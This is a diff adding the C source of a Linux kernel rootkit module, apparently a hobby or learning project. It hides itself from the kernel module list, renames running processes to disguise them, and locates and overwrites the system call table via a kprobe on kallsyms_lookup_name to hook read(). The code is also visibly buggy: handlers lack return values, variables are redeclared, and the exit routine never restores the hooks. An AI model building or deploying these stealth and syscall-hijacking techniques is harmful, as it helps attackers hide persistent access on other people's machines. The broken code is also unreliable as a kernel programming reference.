@@ -1,0 +1,244 @@
+#include "rootkit.h"
+
+#include <asm/syscall.h>
+#include <linux/cdev.h>
+#include <linux/dirent.h>
+#include <linux/fs.h>
+#include <linux/kprobes.h>
+#include <linux/module.h>
+#include <linux/ptrace.h>
+#include <linux/reboot.h>
+#include <linux/sched.h>
+#include <linux/sched/signal.h>
+#include <linux/slab.h>
+#include <linux/syscalls.h>
+#include <linux/uaccess.h>
+#include <linux/version.h>
+
+#define OURMODNAME "rootkit"
+
+kallsyms_lookup_name_t kallsyms_lookup_name_fn;
+syscall_fn_t *sys_call_table_p;
+
+void (*update_mapping_prot)(phys_addr_t phys, unsigned long virt,
+                            phys_addr_t size, pgprot_t prot);
+
+int is_hidden = 0;
+struct filter_info *filter_list;
+syscall_fn_t custom_handlers[NR_syscalls] = {0};
+int total_references[NR_syscalls] = {0};
+
+struct list_head *module_list;
+
+static struct kprobe kp = {
+    .symbol_name = "kallsyms_lookup_name",
+};
+
+// store original syscall handler with type sys_call_t
+typedef asmlinkage long (*sys_call_t)(const struct pt_regs *);
+
+MODULE_AUTHOR("FOOBAR");
+MODULE_DESCRIPTION("FOOBAR");
+MODULE_LICENSE("Dual MIT/GPL");
+MODULE_VERSION("0.1");
+
+static asmlinkage long my_sys_read(unsigned int fd, char __user *buf,
+                                   size_t count) {
+  pr_info("my_sys_read\n");
+  struct filter_info *pos;
+  list_for_each_entry(pos, &filter_list->list, list) {
+    if (strcmp(pos->comm, current->comm) == 0 && pos->syscall_nr == __NR_read) {
+      pr_info("Filtering read syscall for process %s\n", pos->comm);
+      return -EPERM; // ????
+    }
+  }
+
+  if (total_references[__NR_read] == 0) {
+    sys_call_table_p[__NR_read](fd, buf, count);
+  } else {
+    list_for_each_entry(pos, &filter_list->list, list) {
+      if (pos->syscall_nr == __NR_read) {
+        syscall_fn_t orig_syscall = (syscall_fn_t)pos->orig_handler_addr;
+        orig_syscall(fd, buf, count);
+      }
+    }
+  }
+}
+
+static int rootkit_open(struct inode *inode, struct file *filp) {
+  printk(KERN_INFO "%s\n", __func__);
+  return 0;
+}
+
+static int rootkit_release(struct inode *inode, struct file *filp) {
+  printk(KERN_INFO "%s\n", __func__);
+  return 0;
+}
+
+static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
+                          unsigned long arg) {
+  long ret = 0;
+
+  printk(KERN_INFO "%s\n", __func__);
+
+  switch (ioctl) {
+  case IOCTL_MOD_HIDE:
+    if (!is_hidden) {
+      module_list = THIS_MODULE->list.prev;
+      list_del(&THIS_MODULE->list);
+      is_hidden = 1;
+    } else {
+      list_add(&THIS_MODULE->list, module_list);
+      module_list = NULL;
+      is_hidden = 0;
+    }
+    break;
+  case IOCTL_MOD_MASQ:
+    if (module_list == NULL)
+      module_list = THIS_MODULE->list.prev;
+    struct masq_proc_req *req;
+    req = (struct masq_proc_req *)arg;
+
+    for (int i = 0; i < req->len; i++) {
+      struct masq_proc *entry = &req->list[i];
+      if (strlen(entry->new_name) >= strlen(entry->orig_name)) {
+        continue;
+      }
+      printk(KERN_INFO "Masquerading %s as %s\n", entry->orig_name,
+             entry->new_name);
+      struct task_struct *task;
+      for_each_process(task) {
+        if (strcmp(task->comm, entry->orig_name) == 0) {
+          strncpy(task->comm, entry->new_name, MASQ_LEN);
+        }
+      }
+    }
+    break;
+  case IOCTL_ADD_FILTER:
+    // copy from user space
+    struct filter_info *filter =
+        kmalloc(sizeof(struct filter_info), GFP_KERNEL);
+    copy_from_user(filter, (struct filter_info *)arg,
+                   sizeof(struct filter_info));
+
+    if (filter->syscall_nr < 0 || filter->syscall_nr >= NR_syscalls) {
+      // invalid syscall number
+      return -EINVAL;
+    }
+
+    if (filter->comm[0] == '\0') {
+      strncpy(filter->comm, current->comm, TASK_FILTER_LEN);
+      // use current process if name not specified
+    }
+
+    filter_info *pos;
+    list_for_each_entry(pos, &filter_list->list, list) {
+      if (strcmp(pos->comm, filter->comm) == 0) {
+        // process already has a filter
+        return -EEXIST;
+      }
+    }
+
+    if (total_references[filter->syscall_nr] > 0) {
+      list_for_each_entry(pos, &filter_list->list, list) {
+        if (pos->syscall_nr == filter->syscall_nr) {
+          // syscall already has a filter owned by other process
+          // copy the reference
+          filter->orig_syscall = pos->orig_syscall;
+          break;
+        }
+      }
+    } else {
+      // syscall hasn't been filtered yet
+      filter->orig_syscall = sys_call_table_p[filter->syscall_nr];
+      sys_call_table_p[filter->syscall_nr] =
+          custom_handlers[filter->syscall_nr];
+    }
+
+    total_references[filter->syscall_nr] += 1;
+    list_add(&filter->list, &filter_list->list);
+    break;
+
+  case IOCTL_REMOVE_FILTER:
+    struct filter_info *filter = (struct filter_info *)arg;
+    struct filter_info *pos;
+    list_for_each_entry(pos, &filter_list->list, list) {
+      if (strcmp(pos->comm, filter->comm) == 0 &&
+          pos->syscall_nr == filter->syscall_nr) {
+        total_references[pos->syscall_nr] -= 1;
+        if (total_references[pos->syscall_nr] == 0)
+          sys_call_table_p[pos->syscall_nr] = pos->orig_syscall;
+        list_del(&pos->list);
+        kfree(pos);
+        break;
+      }
+    }
+    break;
+  default:
+    ret = -EINVAL;
+  }
+
+  return ret;
+}
+
+static int major;
+static struct class *cls;
+
+struct file_operations fops = {
+  open : rootkit_open,
+  unlocked_ioctl : rootkit_ioctl,
+  release : rootkit_release,
+  owner : THIS_MODULE
+};
+
+static int __init rootkit_init(void) {
+  major = register_chrdev(0, OURMODNAME, &fops);
+  if (major < 0) {
+    pr_err("Registering char device failed with %d\n", major);
+    return major;
+  }
+
+  pr_info("The module was assigned major number %d.\n", major);
+  cls = class_create(THIS_MODULE, OURMODNAME);
+  device_create(cls, NULL, MKDEV(major, 0), NULL, OURMODNAME);
+  pr_info("Device created on /dev/%s\n", OURMODNAME);
+
+  if (register_kprobe(&kp) < 0) {
+    pr_err("register_kprobe failed\n");
+    return -1;
+  }
+
+  kallsyms_lookup_name_fn = (kallsyms_lookup_name_t)kp.addr;
+  unregister_kprobe(&kp);
+
+  sys_call_table_p = (syscall_fn_t *)kallsyms_lookup_name_fn("sys_call_table");
+  update_mapping_prot = (void *)kallsyms_lookup_name_fn("update_mapping_prot");
+  pr_info("sys_call_table at %p\n", sys_call_table_p);
+
+  // change to writable
+  update_mapping_prot((phys_addr_t)sys_call_table_p,
+                      (unsigned long)sys_call_table_p,
+                      sizeof(syscall_fn_t) * NR_syscalls, PAGE_KERNEL);
+
+  // list of all filters by process
+  filter_list = kmalloc(sizeof(filter_info), GFP_KERNEL);
+  filter_list->syscall_nr = -1;
+  INIT_LIST_HEAD(&filter_list.list);
+
+  // hook syscalls
+  custom_handlers[__NR_read] = my_sys_read;
+
+  return 0;
+}
+
+static void __exit rootkit_exit(void) {
+  // TODO: unhook syscall and cleanup syscall filter list
+
+  pr_info("%s: removed\n", OURMODNAME);
+  device_destroy(cls, MKDEV(major, 0));
+  class_destroy(cls);
+  unregister_chrdev(major, OURMODNAME);
+}
+
+module_init(rootkit_init);
+module_exit(rootkit_exit);
